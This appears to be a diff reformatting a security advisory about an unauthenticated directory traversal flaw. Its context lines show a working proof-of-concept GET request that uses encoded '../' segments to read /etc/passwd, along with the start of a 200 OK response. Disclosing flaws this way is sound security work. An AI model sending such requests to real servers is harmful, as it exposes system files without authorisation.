@@ -24,9 +24,7 @@ The unauthenticated Directory Traversal vulnerability can be exploited by issuin
 Example:
 {% highlight ruby %}
 
-REQUEST
-========
-
+REQUEST:
 GET /h2hdocumentation//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
 Host: a.b.c.d
 Accept-Encoding: gzip, deflate
@@ -38,8 +36,7 @@ Connection: close
 
 {% highlight ruby %}
 
-RESPONSE
-========
+RESPONSE:
 HTTP/1.1 200 OK
 Content-Type: text/html
 Content-Length: 1713
